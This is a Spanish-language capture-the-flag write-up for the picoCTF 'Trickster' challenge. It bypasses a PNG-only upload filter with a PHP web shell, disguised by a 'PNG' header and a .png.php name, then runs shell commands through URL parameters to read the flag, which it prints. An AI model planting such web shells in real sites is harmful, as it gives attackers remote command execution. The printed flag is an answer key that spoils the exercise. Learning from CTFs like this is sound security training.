# Trickster

## Description

I found a web app that can help process images: PNG images only! Try it [here](http://atlas.picoctf.net:51380/)!

## Hints

* (None)

## Solución

Ingresamos al sitio web que nos proporcionan, una vez dentro, nos muestra que se pueden subir archivos **PNG** ósea imágenes, cuando intentamos subir una imagen, no nos muestra nada, entonces para continuar hacemos lo siguiente:

En un archivo de texto escribimos el siguiente código y lo guardamos como archivo **PHP**:

```php
PNG
<?php
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>
```

Después en una terminal de ubuntu, ingresamos los siguientes comandos para transformar nuestro archivo de **.PHP** a **.PNG**:
**Nota importante:}** El archivo debe estar en la carpeta correspondiente de linux.
```
nano Trickster.php
cat Trickster.php

mv Trickster.php Trickster.png.php
cat Trickster.png.php
```

Una vez realizado esto, nos volvemos a dirigir a nuestro sitio web y subimos nuestro archivo **PNG.PHP** al link que tenemos.
![[Pasted image 20250403101432.png]]

Una vez subido **el .PNG.PHP** al sitio web, al final del link ingresamos: **/uploads/Trickster.png.php?cmd=pwd** 
**Nota importante:** Se debe poner el nombre en el que se guardo el archivo.
```
http://atlas.picoctf.net:51380/uploads/Trickster.png.php?cmd=pwd

PNG /var/www/html/uploads
```

En el link lo volvemos a modificar al final pero esta vez solo agregamos: **ls ..**
```
http://atlas.picoctf.net:51380/uploads/Trickster.png.php?cmd=ls ..

PNG HFQWKODGMIYTO.txt index.php instructions.txt robots.txt uploads
```

De lo que nos salió en la pantalla copiamos el primer texto que tiene terminación: **HFQWKODGMIYTO.txt** y lo agregamos al final, también se agrega un cat para que nos muestre nuestra respectiva flag:
```
http://atlas.picoctf.net:51380/uploads/Trickster.png.php?cmd=cat%20../HFQWKODGMIYTO.txt

PNG /* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_9ae8fb17} */
```

### Respuesta: picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_9ae8fb17}